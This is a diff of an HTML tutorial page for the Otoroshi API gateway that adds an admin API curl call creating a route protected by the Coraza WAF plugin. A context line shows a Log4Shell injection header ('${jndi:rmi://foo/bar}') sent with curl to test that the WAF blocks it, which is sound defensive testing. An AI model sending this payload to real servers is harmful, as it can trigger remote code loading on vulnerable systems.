@@ -399,6 +399,61 @@ EOF
 </code></pre>
 <h3><a href="#add-the-waf-plugin-on-your-route" name="add-the-waf-plugin-on-your-route" class="anchor"><span class="anchor-link"></span></a>Add the WAF plugin on your route</h3>
 <p>Now you can create a new route that will use your WAF configuration. Let say we want a route on <code>http://wouf.oto.tools:8080</code> to goes to <code>https://www.otoroshi.io</code>. Now add the <code>Coraza WAF</code> plugin to your route and in the configuration select the configuration you created previously.</p>
+<p>the corresponding admin api call is the following :</p>
+<pre class="prettyprint"><code class="language-sh">curl -X POST &#39;http://otoroshi-api.oto.tools:9999/api/routes&#39; -u admin-api-apikey-id:admin-api-apikey-secret -H &#39;Content-Type: application/json&#39; -d &#39;
+{
+  &quot;id&quot;: &quot;route_demo&quot;,
+  &quot;name&quot;: &quot;WAF route&quot;,
+  &quot;description&quot;: &quot;A new route with a WAF enabled&quot;,
+  &quot;tags&quot;: [],
+  &quot;metadata&quot;: {},
+  &quot;enabled&quot;: true,
+  &quot;frontend&quot;: {
+    &quot;domains&quot;: [
+      &quot;wouf.oto.tools&quot;
+    ]
+  },
+  &quot;backend&quot;: {
+    &quot;targets&quot;: [
+      {
+        &quot;id&quot;: &quot;target_1&quot;,
+        &quot;hostname&quot;: &quot;www.otoroshi.io&quot;,
+        &quot;port&quot;: 443,
+        &quot;tls&quot;: true
+      }
+    ],
+    &quot;root&quot;: &quot;/&quot;
+  },
+  &quot;plugins&quot;: [
+    {
+      &quot;enabled&quot;: true,
+      &quot;debug&quot;: false,
+      &quot;plugin&quot;: &quot;cp:otoroshi.wasm.proxywasm.NgCorazaWAF&quot;,
+      &quot;include&quot;: [],
+      &quot;exclude&quot;: [],
+      &quot;config&quot;: {
+        &quot;ref&quot;: &quot;coraza-waf-demo&quot;
+      },
+      &quot;plugin_index&quot;: {
+        &quot;validate_access&quot;: 0,
+        &quot;transform_request&quot;: 1,
+        &quot;transform_response&quot;: 0
+      }
+    },
+    {
+      &quot;enabled&quot;: true,
+      &quot;debug&quot;: false,
+      &quot;plugin&quot;: &quot;cp:otoroshi.next.plugins.OverrideHost&quot;,
+      &quot;include&quot;: [],
+      &quot;exclude&quot;: [],
+      &quot;config&quot;: {},
+      &quot;plugin_index&quot;: {
+        &quot;transform_request&quot;: 2
+      }
+    }
+  ]
+}&#39;
+</code></pre>
 <h3><a href="#try-to-use-an-exploit-" name="try-to-use-an-exploit-" class="anchor"><span class="anchor-link"></span></a>Try to use an exploit ;)</h3>
 <p>let try to trigger Coraza with a Log4Shell creafted request:</p>
 <pre class="prettyprint"><code class="language-sh">curl http://wouf.oto.tools:9999 -H &#39;foo: ${jndi:rmi://foo/bar}&#39; --include
